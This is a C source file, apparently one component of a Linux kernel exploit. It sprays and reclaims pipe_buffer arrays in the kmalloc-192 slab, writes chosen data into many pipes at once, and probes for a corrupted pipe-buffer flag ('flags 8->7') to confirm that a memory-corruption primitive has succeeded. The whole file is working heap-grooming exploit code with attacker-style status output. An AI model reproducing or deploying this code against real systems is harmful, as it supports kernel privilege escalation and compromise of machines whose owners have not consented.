#define _GNU_SOURCE

#include "t870_pipe_wave.h"

#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

void t870_pipe_wave_release(struct t870_pipe_wave *wave)
{
    unsigned int i;

    for (i = 0; i < T870_PIPE_WAVE_COUNT; ++i) {
        if (wave->fds[i][0] >= 0) {
            close(wave->fds[i][0]);
            wave->fds[i][0] = -1;
        }
        if (wave->fds[i][1] >= 0) {
            close(wave->fds[i][1]);
            wave->fds[i][1] = -1;
        }
    }
}

int t870_pipe_wave_prepare(struct t870_pipe_wave *wave, int packetized)
{
    unsigned int i;

    if (wave == NULL) {
        errno = EINVAL;
        return -1;
    }
    for (i = 0; i < T870_PIPE_WAVE_COUNT; ++i) {
        wave->fds[i][0] = -1;
        wave->fds[i][1] = -1;
    }
    for (i = 0; i < T870_PIPE_WAVE_COUNT; ++i) {
        int pipe_flags = O_CLOEXEC | O_NONBLOCK;

        if (packetized)
            pipe_flags |= O_DIRECT;
        if (pipe2(wave->fds[i], pipe_flags) != 0) {
            fprintf(stderr, "[-] prepare pipe %u: %s\n", i,
                    strerror(errno));
            t870_pipe_wave_release(wave);
            return -1;
        }
    }
    printf("[+] pipe-buffer reclaim prepared pipes=%u packetized=%d "
           "target_array=4*40=160 kmalloc-192\n", T870_PIPE_WAVE_COUNT,
           packetized);
    return 0;
}

unsigned int t870_pipe_wave_populate(struct t870_pipe_wave *wave,
                                     unsigned int buffer_count)
{
    static unsigned char page[T870_PIPE_WAVE_PAGE_SIZE];
    unsigned int i;
    unsigned int submitted = 0;

    if (buffer_count == 0U || buffer_count > 3U)
        return 0;
    memset(page, 'P', sizeof(page));
    for (i = 0; i < T870_PIPE_WAVE_COUNT; ++i) {
        int capacity = fcntl(wave->fds[i][1], F_SETPIPE_SZ,
                             T870_PIPE_WAVE_CAPACITY);
        unsigned int buffer;
        int complete = 1;

        if (capacity != (int)T870_PIPE_WAVE_CAPACITY)
            continue;
        for (buffer = 0; buffer < buffer_count; ++buffer) {
            ssize_t written = write(wave->fds[i][1], page, sizeof(page));

            if (written != (ssize_t)sizeof(page)) {
                complete = 0;
                break;
            }
        }
        if (complete)
            ++submitted;
    }
    return submitted;
}

unsigned int t870_pipe_wave_write_all(struct t870_pipe_wave *wave,
                                      const void *data, size_t size)
{
    unsigned int i;
    unsigned int written_count = 0;

    if (data == NULL || size == 0U || size >= T870_PIPE_WAVE_PAGE_SIZE)
        return 0;
    for (i = 0; i < T870_PIPE_WAVE_COUNT; ++i) {
        ssize_t written = write(wave->fds[i][1], data, size);

        if (written == (ssize_t)size)
            ++written_count;
    }
    return written_count;
}

unsigned int t870_pipe_wave_probe_packet_decrement(
    struct t870_pipe_wave *wave)
{
    static unsigned char page[T870_PIPE_WAVE_PAGE_SIZE];
    unsigned int i;
    unsigned int changed = 0;

    for (i = 0; i < T870_PIPE_WAVE_COUNT; ++i) {
        ssize_t first = read(wave->fds[i][0], page, sizeof(page));
        ssize_t second = read(wave->fds[i][0], page, sizeof(page));
        ssize_t third = read(wave->fds[i][0], page, 1);
        ssize_t remainder = read(wave->fds[i][0], page, 1);

        if (first != (ssize_t)sizeof(page) ||
            second != (ssize_t)sizeof(page) || third != 1)
            continue;
        if (remainder == 1) {
            printf("[+] packet flag decrement observed pipe=%u: "
                   "third packet retained its remainder (flags 8->7)\n", i);
            ++changed;
        }
    }
    return changed;
}
